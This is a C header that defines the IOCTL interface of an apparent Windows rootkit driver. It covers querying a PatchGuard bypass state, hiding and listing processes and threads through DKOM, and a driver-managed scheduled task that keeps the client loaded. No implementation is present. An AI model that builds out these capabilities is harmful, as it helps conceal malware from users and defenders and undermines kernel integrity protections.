#pragma once

//
// IOCTL CODES
//
// CTL_CODE(DeviceType, Function, Method, Access)

#if defined(_KERNEL_MODE) || defined(_NTDDK_) || defined(_WDMDDK_)
#include <ntddk.h>
#else
#include <windows.h>
#include <winioctl.h>
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
#endif

#define DRIVER_DEVICE_TYPE 0x8000

// Basic control
#define IOCTL_PING                                                             \
  CTL_CODE(DRIVER_DEVICE_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GET_VERSION                                                      \
  CTL_CODE(DRIVER_DEVICE_TYPE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
//
// Query PatchGuard bypass state. Output DRIVER_RESPONSE:
//   Status = STATUS_SUCCESS, Data = 1 (bypassed) / 0 (safe mode).
//
#define IOCTL_GET_PG_STATUS                                                    \
  CTL_CODE(DRIVER_DEVICE_TYPE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
//
// Sus zone
//
// Process DKOM (hide / reveal / list hidden)
#define IOCTL_HIDE_PROCESS                                                     \
  CTL_CODE(DRIVER_DEVICE_TYPE, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNHIDE_PROCESS                                                   \
  CTL_CODE(DRIVER_DEVICE_TYPE, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_LIST_HIDDEN_PROCESSES                                            \
  CTL_CODE(DRIVER_DEVICE_TYPE, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Thread DKOM (hide / reveal / list hidden)
#define IOCTL_HIDE_THREAD                                                      \
  CTL_CODE(DRIVER_DEVICE_TYPE, 0x903, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNHIDE_THREAD                                                    \
  CTL_CODE(DRIVER_DEVICE_TYPE, 0x904, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_LIST_HIDDEN_THREADS                                              \
  CTL_CODE(DRIVER_DEVICE_TYPE, 0x905, METHOD_BUFFERED, FILE_ANY_ACCESS)

//
// Auto-load task control. Input TASK_REQUEST, output DRIVER_RESPONSE:
//   Status = NTSTATUS of the operation, Data = 1 when the task is currently
//   enabled. The task is managed wholly by the driver (auto-created at load).
//
#define IOCTL_TASK_CONTROL                                                     \
  CTL_CODE(DRIVER_DEVICE_TYPE, 0x906, METHOD_BUFFERED, FILE_ANY_ACCESS)
//
// Supplies the client's own Win32 image path to the driver so the auto-load
// task can reference it directly ("C:\Users\...\Client.exe") instead of a
// \Device\... NT path the scheduler refuses to launch. Input: UTF-16 string.
//
#define IOCTL_TASK_SET_IMAGE_PATH                                              \
  CTL_CODE(DRIVER_DEVICE_TYPE, 0x907, METHOD_BUFFERED, FILE_ANY_ACCESS)
//
// Exchange data struct
//

// Operations for IOCTL_TASK_CONTROL.
#define TASK_OP_QUERY 0
#define TASK_OP_ENABLE 1
#define TASK_OP_DISABLE 2

// Input of IOCTL_TASK_CONTROL.
typedef struct _TASK_REQUEST {
  ULONG Operation;
} TASK_REQUEST, *PTASK_REQUEST;

// Max number of processes tracked in the hidden registry.
#define MAX_HIDDEN_PROCESSES 64

// Max number of threads tracked in the hidden registry.
#define MAX_HIDDEN_THREADS 64

// Input of IOCTL_HIDE_PROCESS / IOCTL_UNHIDE_PROCESS.
typedef struct _PROCESS_REQUEST {
  ULONG ProcessId;
} PROCESS_REQUEST, *PPROCESS_REQUEST;

// Input of IOCTL_HIDE_THREAD / IOCTL_UNHIDE_THREAD.
typedef struct _THREAD_REQUEST {
  ULONG ThreadId;
} THREAD_REQUEST, *PTHREAD_REQUEST;

// Output of IOCTL_LIST_HIDDEN_PROCESSES.
typedef struct _PROCESS_LIST_RESPONSE {
  ULONG Count;
  ULONG ProcessIds[MAX_HIDDEN_PROCESSES];
} PROCESS_LIST_RESPONSE, *PPROCESS_LIST_RESPONSE;

// Output of IOCTL_LIST_HIDDEN_THREADS.
typedef struct _THREAD_LIST_RESPONSE {
  ULONG Count;
  ULONG ThreadIds[MAX_HIDDEN_THREADS];
} THREAD_LIST_RESPONSE, *PTHREAD_LIST_RESPONSE;

// default response
typedef struct _DRIVER_RESPONSE {
  NTSTATUS Status;
  ULONG Data;
} DRIVER_RESPONSE, *PDRIVER_RESPONSE;